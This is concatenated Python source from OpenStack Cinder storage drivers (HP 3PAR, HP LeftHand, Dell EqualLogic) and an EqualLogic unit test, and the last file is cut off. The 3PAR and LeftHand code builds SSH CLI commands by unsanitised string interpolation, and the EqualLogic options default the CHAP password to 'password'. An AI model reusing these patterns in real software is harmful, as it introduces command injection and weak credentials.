        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': "%s:%s" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """Driver entry point to unattach a volume from an instance."""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \                    
              (persona_id, domain, hostname, iscsi_iqn)                    
        out = self.common._cli_run(cmd, None)                    
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'                    
                             % (hostname, iscsi_iqn), None)                    

    def _create_host(self, volume, connector):
        """Creates or modifies existing 3PAR host."""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _("Least busy iSCSI port not found, "
                        "using first iSCSI port in list.")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """Return the list of candidate nsps."""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """Return IP assiciated with given nsp."""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """Return the active nsp, if one exists, for the given host."""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)                    
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split(",")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"Return the nsp that has the fewest active vluns."""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)                    

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)

#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
"""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """Runs a CLIQ command over SSH, without doing any result parsing"""
        cliq_arg_strings = []                    
        for k, v in cliq_args.items():
            cliq_arg_strings.append(" %s=%s" % (k, v))                    
        cmd = verb + ''.join(cliq_arg_strings)                    

        return self._run_ssh(cmd, check_exit_code)                    

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """Runs a CLIQ command over SSH, parsing and checking the output"""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_("CLIQ command returned %s"), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find("response")
            if response_node is None:
                msg = (_("Malformed response to CLIQ command "
                         "%(verb)s %(cliq_args)s. Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get("result")

            if result_code != "0":
                msg = (_("Error running CLIQ command %(verb)s %(cliq_args)s. "
                         " Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """Queries for info about the cluster (including IP)"""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml("getClusterInfo", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """Gets the IP on which a cluster shares iSCSI volumes"""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall("response/cluster/vip"):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_("Unexpected number of virtual ips for cluster "
                 " %(cluster_name)s. Result=%(_xml)s") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """Gets the volume info, including IQN"""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml("getVolumeInfo", cliq_args)

        # Result looks like this:
        #<gauche version="1.0">
        #  <response description="Operation succeeded." name="CliqSuccess"
        #            processingTime="87" result="0">
        #    <volume autogrowPages="4" availability="online" blockSize="1024"
        #       bytesWritten="0" checkSum="false" clusterName="Cluster01"
        #       created="2011-02-08T19:56:53Z" deleting="false" description=""
        #       groupName="Group01" initialQuota="536870912" isPrimary="true"
        #       iscsiIqn="iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b"
        #       maxSize="6865387257856" md5="9fa5c8b2cca54b2948a63d833097e1ca"
        #       minReplication="1" name="vol-b" parity="0" replication="2"
        #       reserveQuota="536870912" scratchQuota="4194304"
        #       serialNumber="9fa5c8b2cca54b2948a63d833097e1ca0000000000006316"
        #       size="1073741824" stridePages="32" thinProvision="true">
        #      <status description="OK" value="2"/>
        #      <permission access="rw"
        #            authGroup="api-34281B815713B78-(trimmed)51ADD4B7030853AA7"
        #            chapName="chapusername" chapRequired="true" id="25369"
        #            initiatorSecret="" iqn="" iscsiEnabled="true"
        #            loadBalance="true" targetSecret="supersecret"/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find("response/volume")
        for k, v in volume_node.attrib.items():
            volume_attributes["volume." + k] = v

        status_node = volume_node.find("status")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["status." + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find("permission")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["permission." + k] = v

        LOG.debug(_("Volume info: %(volume_name)s => %(volume_attributes)s") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """Creates a volume."""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml("createVolume", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + ":3260," + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = ("%s %s %s" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """Creates a volume from a snapshot."""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """Creates a snapshot."""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """Deletes a volume."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error("Volume did not exist. It will not be deleted")
            return
        self._cliq_run_xml("deleteVolume", cliq_args)

    def local_path(self, volume):
        msg = _("local_path not supported")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("assignVolumeToServer", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml("getServerInfo", cliq_args, False)
        response = out.find("response")
        result = response.attrib.get("result")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml("createServer", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """Unassign the volume from the host."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("unassignVolumeToServer", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml("getClusterInfo", {})
        cluster_node = result_xml.find("response/cluster")
        total_capacity = cluster_node.attrib.get("spaceTotal")
        free_capacity = cluster_node.attrib.get("unprovisionedSpace")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

import time

import mox
import paramiko

from cinder import context
from cinder import exception
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers import eqlx


LOG = logging.getLogger(__name__)


class DellEQLSanISCSIDriverTestCase(test.TestCase):

    def setUp(self):
        super(DellEQLSanISCSIDriverTestCase, self).setUp()
        self.configuration = mox.MockObject(conf.Configuration)
        self.configuration.append_config_values(mox.IgnoreArg())
        self.configuration.san_is_local = False
        self.configuration.san_ip = "10.0.0.1"
        self.configuration.san_login = "foo"
        self.configuration.san_password = "bar"
        self.configuration.san_ssh_port = 16022
        self.configuration.san_thin_provision = True
        self.configuration.eqlx_pool = 'non-default'
        self.configuration.eqlx_use_chap = True
        self.configuration.eqlx_group_name = 'group-0'
        self.configuration.eqlx_cli_timeout = 30
        self.configuration.eqlx_cli_max_retries = 5
        self.configuration.eqlx_chap_login = 'admin'
        self.configuration.eqlx_chap_password = 'password'
        self.configuration.volume_name_template = 'volume_%s'
        self._context = context.get_admin_context()
        self.driver = eqlx.DellEQLSanISCSIDriver(
            configuration=self.configuration)
        self.volume_name = "fakevolume"
        self.volid = "fakeid"
        self.connector = {'ip': '10.0.0.2',
                          'initiator': 'iqn.1993-08.org.debian:01:222',
                          'host': 'fakehost'}
        self.fake_iqn = 'iqn.2003-10.com.equallogic:group01:25366:fakev'
        self.driver._group_ip = '10.0.1.6'
        self.properties = {
            'target_discoverd': True,
            'target_portal': '%s:3260' % self.driver._group_ip,
            'target_iqn': self.fake_iqn,
            'volume_id': 1}
        self._model_update = {
            'provider_location': "%s:3260,1 %s 0" % (self.driver._group_ip,
                                                     self.fake_iqn),
            'provider_auth': 'CHAP %s %s' % (
                self.configuration.eqlx_chap_login,
                self.configuration.eqlx_chap_password)
        }

    def _fake_get_iscsi_properties(self, volume):
        return self.properties

    def test_create_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'create', volume['name'],
                                 "%sG" % (volume['size']), 'pool',
                                 self.configuration.eqlx_pool,
                                 'thin-provision').\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume(volume)
        self.assertEqual(model_update, self._model_update)

    def test_delete_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.driver._eql_execute('volume', 'select', volume['name'], 'offline')
        self.driver._eql_execute('volume', 'delete', volume['name'])
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_delete_absent_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1, 'id': self.volid}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show').\
            AndRaise(processutils.ProcessExecutionError(
                stdout='% Error ..... does not exist.\n'))
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_ensure_export(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.mox.ReplayAll()
        self.driver.ensure_export({}, volume)

    def test_create_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        snap_name = 'fake_snap_name'
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'create-now').\
            AndReturn(['Snapshot name is %s' % snap_name])
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'rename', snap_name,
                                 snapshot['name'])
        self.mox.ReplayAll()
        self.driver.create_snapshot(snapshot)

    def test_create_volume_from_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'select', snapshot['name'],
                                 'clone', volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume_from_snapshot(volume,
                                                               snapshot)
        self.assertEqual(model_update, self._model_update)

    def test_create_cloned_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        src_vref = {'id': 'fake_uuid'}
        volume = {'name': self.volume_name}
        src_volume_name = self.configuration.\
            volume_name_template % src_vref['id']
        self.driver._eql_execute('volume', 'select', src_volume_name, 'clone',
                                 volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertEqual(model_update, self._model_update)

    def test_delete_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'delete', snapshot['name'])
        self.mox.ReplayAll()
        self.driver.delete_snapshot(snapshot)

    def test_extend_volume(self):
        new_size = '200'
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 100}
        self.driver._eql_execute('volume', 'select', volume['name'],
                                 'size', "%sG" % new_size)
        self.mox.ReplayAll()
        self.driver.extend_volume(volume, new_size)

    def test_initialize_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.stubs.Set(self.driver, "_get_iscsi_properties",
                       self._fake_get_iscsi_properties)
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'create', 'initiator',
                                 self.connector['initiator'],
                                 'authmethod chap',                    
                                 'username',
                                 self.configuration.eqlx_chap_login)
        self.mox.ReplayAll()
        iscsi_properties = self.driver.initialize_connection(volume,
                                                             self.connector)
        self.assertEqual(iscsi_properties['data'],
                         self._fake_get_iscsi_properties(volume))

    def test_terminate_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'delete', '1')
        self.mox.ReplayAll()
        self.driver.terminate_connection(volume, self.connector)

    def test_do_setup(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        fake_group_ip = '10.1.2.3'
        for feature in ('confirmation', 'paging', 'events', 'formatoutput'):
            self.driver._eql_execute('cli-settings', feature, 'off')
        self.driver._eql_execute('grpparams', 'show').\
            AndReturn(['Group-Ipaddress: %s' % fake_group_ip])
        self.mox.ReplayAll()
        self.driver.do_setup(self._context)
        self.assertEqual(fake_group_ip, self.driver._group_ip)

    def test_update_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        self.driver._update_volume_stats()
        self.assertEqual(self.driver._stats['total_capacity_gb'], 111.0)
        self.assertEqual(self.driver._stats['free_capacity_gb'], 11.0)

    def test_get_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        stats = self.driver.get_volume_stats(refresh=True)
        self.assertEqual(stats['total_capacity_gb'], float('111.0'))
        self.assertEqual(stats['free_capacity_gb'], float('11.0'))
        self.assertEqual(stats['vendor_name'], 'Dell')

    def test_get_space_in_gb(self):
        self.assertEqual(self.driver._get_space_in_gb('123.0GB'), 123.0)
        self.assertEqual(self.driver._get_space_in_gb('123.0TB'), 123.0 * 1024)
        self.assertEqual(self.driver._get_space_in_gb('1024.0MB'), 1.0)

    def test_get_output(self):

        def _fake_recv(ignore_arg):
            return '%s> ' % self.configuration.eqlx_group_name

        chan = self.mox.CreateMock(paramiko.Channel)
        self.stubs.Set(chan, "recv", _fake_recv)
        self.assertEqual(self.driver._get_output(chan), [_fake_recv(None)])

    def test_get_prefixed_value(self):
        lines = ['Line1 passed', 'Line1 failed']
        prefix = ['Line1', 'Line2']
        expected_output = [' passed', None]
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[0]),
                         expected_output[0])
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[1]),
                         expected_output[1])

    def test_ssh_execute(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['NoError: test run']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertEqual(self.driver._ssh_execute(ssh, cmd), expected_output)

    def test_ssh_execute_error(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(ssh, 'get_transport')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['Error: test run', '% Error']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertRaises(processutils.ProcessExecutionError,
                          self.driver._ssh_execute, ssh, cmd)

    def test_with_timeout(self):
        @eqlx.with_timeout
        def no_timeout(cmd, *args, **kwargs):
            return 'no timeout'

        @eqlx.with_timeout
        def w_timeout(cmd, *args, **kwargs):
            time.sleep(1)

        self.assertEqual(no_timeout('fake cmd'), 'no timeout')
        self.assertRaises(exception.VolumeBackendAPIException,
                          w_timeout, 'fake cmd', timeout=0.1)

    def test_local_path(self):
        self.assertRaises(NotImplementedError, self.driver.local_path, '')

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

"""Volume driver for Dell EqualLogic Storage."""

import functools
import random

import eventlet
from eventlet import greenthread
import greenlet
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import utils
from cinder.volume.drivers.san import SanISCSIDriver

LOG = logging.getLogger(__name__)

eqlx_opts = [
    cfg.StrOpt('eqlx_group_name',
               default='group-0',
               help='Group name to use for creating volumes'),
    cfg.IntOpt('eqlx_cli_timeout',
               default=30,
               help='Timeout for the Group Manager cli command execution'),
    cfg.IntOpt('eqlx_cli_max_retries',
               default=5,
               help='Maximum retry count for reconnection'),
    cfg.BoolOpt('eqlx_use_chap',
                default=False,
                help='Use CHAP authentication for targets?'),
    cfg.StrOpt('eqlx_chap_login',
               default='admin',
               help='Existing CHAP account name'),
    cfg.StrOpt('eqlx_chap_password',
               default='password',
               help='Password for specified CHAP account name',
               secret=True),
    cfg.StrOpt('eqlx_pool',
               default='default',
               help='Pool in which volumes will be created')
]


CONF = cfg.CONF
CONF.register_opts(eqlx_opts)


def with_timeout(f):
    @functools.wraps(f)
    def __inner(self, *args, **kwargs):
        timeout = kwargs.pop('timeout', None)
        gt = eventlet.spawn(f, self, *args, **kwargs)
        if timeout is None:
            return gt.wait()
        else:
            kill_thread = eventlet.spawn_after(timeout, gt.kill)
            try:
                res = gt.wait()
            except greenlet.GreenletExit:
                raise exception.VolumeBackendAPIException(
                    data="Command timed out")
            else:
                kill_thread.cancel()
                return res

    return __inner


class DellEQLSanISCSIDriver(SanISCSIDriver):
    """Implements commands for Dell EqualLogic SAN ISCSI management.

    To enable the driver add the following line to the cinder configuration:
        volume_driver=cinder.volume.drivers.eqlx.DellEQLSanISCSIDriver

    Driver's prerequisites are:
        - a separate volume group set up and running on the SAN
        - SSH access to the SAN
        - a special user must be created which must be able to
            - create/delete volumes and snapshots;
            - clone snapshots into volumes;
            - modify volume access records;

    The access credentials to the SAN are provided by means of the following
    flags
        san_ip=<ip_address>
        san_login=<user name>
        san_password=<user password>
        san_private_key=<file containing SSH private key>

    Thin provision of volumes is enabled by default, to disable it use:
        san_thin_provision=false

    In order to use target CHAP authentication (which is disabled by default)
    SAN administrator must create a local CHAP user and specify the following
    flags for the driver:
        eqlx_use_chap=true
        eqlx_chap_login=<chap_login>
        eqlx_chap_password=<chap_password>

    eqlx_group_name parameter actually represents the CLI prompt message
    without '>' ending. E.g. if prompt looks like 'group-0>', then the
    parameter must be set to 'group-0'

    Also, the default CLI command execution timeout is 30 secs. Adjustable by
        eqlx_cli_timeout=<seconds>
    """

    VERSION = "1.0.0"

    def __init__(self, *args, **kwargs):
        super(DellEQLSanISCSIDriver, self).__init__(*args, **kwargs)
        self.configuration.append_config_values(eqlx_opts)
        self._group_ip = None
        self.sshpool = None

    def _get_output(self, chan):
        out = ''
        ending = '%s> ' % self.configuration.eqlx_group_name
        while not out.endswith(ending):
            out += chan.recv(102400)

        LOG.debug(_("CLI output\n%s"), out)
        return out.splitlines()

    def _get_prefixed_value(self, lines, prefix):
        for line in lines:
            if line.startswith(prefix):
                return line[len(prefix):]
        return

    @with_timeout
    def _ssh_execute(self, ssh, command, *arg, **kwargs):
        transport = ssh.get_transport()
        chan = transport.open_session()
        chan.invoke_shell()

        LOG.debug(_("Reading CLI MOTD"))
        self._get_output(chan)

        cmd = 'stty columns 255'
        LOG.debug(_("Setting CLI terminal width: '%s'"), cmd)
        chan.send(cmd + '\r')
        out = self._get_output(chan)

        LOG.debug(_("Sending CLI command: '%s'"), command)
        chan.send(command + '\r')
        out = self._get_output(chan)

        chan.close()

        if any(line.startswith(('% Error', 'Error:')) for line in out):
            desc = _("Error executing EQL command")
            cmdout = '\n'.join(out)
            LOG.error(cmdout)
            raise processutils.ProcessExecutionError(
                stdout=cmdout, cmd=command, description=desc)
        return out

    def _run_ssh(self, cmd_list, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
